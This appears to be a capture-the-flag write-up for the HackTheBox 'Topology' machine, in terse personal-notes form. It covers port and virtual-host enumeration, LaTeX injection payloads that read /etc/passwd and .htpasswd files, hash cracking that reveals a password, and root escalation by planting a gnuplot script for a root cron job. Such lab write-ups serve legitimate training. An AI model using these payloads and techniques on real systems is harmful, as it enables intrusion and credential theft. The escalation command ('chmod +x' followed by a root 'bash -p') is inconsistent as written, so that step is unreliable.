 #HackTheBox #easy #linux
# Enum
## nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
```

## gobuster dir
/css                  (Status: 301) [Size: 310] [--> http://topology.htb/css/]
/images               (Status: 301) [Size: 313] [--> http://topology.htb/images/]
/javascript           (Status: 301) [Size: 317] [--> http://topology.htb/javascript/]
/portraits            (Status: 301) [Size: 316] [--> http://topology.htb/portraits/]

## gobuster vhost
-# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://topology.htb/ -t 50 --append-domain
	Found: stats.topology.htb Status: 200 [Size: 108]
	Found: dev.topology.htb Status: 401 [Size: 463]

## nmap
─# nmap -Pn -sS -sC -sV -v latex.topology.htb
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
	|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
	|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
	80/tcp open  http    Apache httpd 2.4.41
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	| http-ls: Volume /
	|   maxfiles limit reached (10)
	| SIZE  TIME              FILENAME
	| -     2023-01-17 12:26  demo/
	| 1.0K  2023-01-17 12:26  demo/fraction.png
	| 1.1K  2023-01-17 12:26  demo/greek.png
	| 1.1K  2023-01-17 12:26  demo/sqrt.png
	| 1.0K  2023-01-17 12:26  demo/summ.png
	| 3.8K  2023-01-17 12:26  equation.php
	| 662   2023-01-17 12:26  equationtest.aux
	| 17K   2023-01-17 12:26  equationtest.log
	| 0     2023-01-17 12:26  equationtest.out
	| 28K   2023-01-17 12:26  equationtest.pdf
	|_
	|_http-title: Index of /


## Find in wep
lklein@topology.htb

# Exploit
## latex.topology.htb exploit

```
\newread\file \openin\file=/etc/passwd \read\file to\line \text{\line} \closein\file
```
![[Pasted image 20230616093212.png]]

```
\newread\file \openin\file=/var/www/dev/.htaccess \read\file to\line \text{\line} \closein\file
```
![[Pasted image 20230617004941.png]]

```
$ \lstinputlisting{/var/www/dev/.htpasswd} $
```
![[Pasted image 20230617101616.png]]

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/htb]
└─# john vdaisleyHash -wordlist=/usr/share/wordlists/rockyou.txt
creds : vdaisley
```
calculus20
```

**htpasswd files**
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
password         (username) 

username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
foo              (username) 

## PrivEsc
vdaisley@topology:~$ /tmp/pspy64
```
CMD: UID=0     PID=1764   | /bin/sh -c /opt/gnuplot/getdata.sh 
CMD: UID=0     PID=1763   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
CMD: UID=0     PID=1762   | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
```

vdaisley@topology:/tmp$ echo 'system "chmod +x /bin/bash"' > /opt/gnuplot/shellbash.plt

vdaisley@topology:~$ bash -p
bash-5.0# id
uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) groups=1007(vdaisley)
bash-5.0# cat /root/root.txt
```
95128b205df80f11e39f599c9816f96b
```
